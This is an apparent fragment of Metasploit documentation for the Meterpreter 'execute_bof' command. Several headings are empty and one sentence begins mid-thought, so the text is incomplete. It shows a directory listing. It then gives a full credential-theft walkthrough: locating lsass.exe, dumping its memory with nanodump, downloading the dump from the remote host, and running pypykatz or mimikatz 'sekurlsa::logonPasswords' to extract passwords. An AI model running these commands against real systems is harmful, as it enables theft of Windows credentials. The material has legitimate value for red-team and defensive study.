# Execution Environment
# Usage
## Compile
## Entry Point
## Argument Format-String
# Usage Examples
Executing [dir][4], passing the path argument and number of sub-directories to list.
```msf
meterpreter > execute_bof CS-Situational-Awareness-BOF/SA/dir/dir.x64.o --format-string Zs C:\\ 0
Contents of C:\*:
	08/05/2022 15:17           <dir> $Recycle.Bin
	08/05/2022 15:16      <junction> Documents and Settings
	09/22/2022 08:35      1342177280 pagefile.sys
	08/05/2022 16:48           <dir> PerfLogs
	09/08/2022 12:51           <dir> Program Files
	09/15/2018 05:06           <dir> Program Files (x86)
	08/05/2022 15:26           <dir> ProgramData
	09/07/2022 10:24           <dir> Python27
	08/05/2022 15:16           <dir> Recovery
	08/05/2022 15:40           <dir> System Volume Information
	08/05/2022 15:16           <dir> Users
	09/01/2022 13:49           <dir> Windows
	                      1342177280 Total File Size for 1 File(s)
	                                                     11 Dir(s)

meterpreter > 
```

written to disk. Once completed, the dump file can be downloaded from the remote host.
```msf
meterpreter > ps lsass
Filtering on 'lsass'

Process List
============

 PID  PPID  Name       Arch  Session  User                 Path
 ---  ----  ----       ----  -------  ----                 ----
 712  556   lsass.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\lsass.exe

meterpreter > execute_bof nanodump.x64.o --format-string iziiiiiiiiziiiz 712 nanodump.dmp 1 1 0 0 0 0 0 0 "" 0 0 0 ""
Done, to download the dump run:
download nanodump.dmp
to get the secretz run:
python3 -m pypykatz lsa minidump nanodump.dmp
mimikatz.exe "sekurlsa::minidump nanodump.dmp" "sekurlsa::logonPasswords full" exit
meterpreter > download nanodump.dmp 
[*] Downloading: nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 1.00 MiB of 11.56 MiB (8.65%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 2.00 MiB of 11.56 MiB (17.31%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 3.00 MiB of 11.56 MiB (25.96%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 4.00 MiB of 11.56 MiB (34.62%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 5.00 MiB of 11.56 MiB (43.27%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 6.00 MiB of 11.56 MiB (51.92%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 7.00 MiB of 11.56 MiB (60.58%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 8.00 MiB of 11.56 MiB (69.23%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 9.00 MiB of 11.56 MiB (77.89%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 10.00 MiB of 11.56 MiB (86.54%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 11.00 MiB of 11.56 MiB (95.2%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] Downloaded 11.56 MiB of 11.56 MiB (100.0%): nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
[*] download   : nanodump.dmp -> /mnt/hgfs/vmshare/nanodump.dmp
meterpreter > 
```

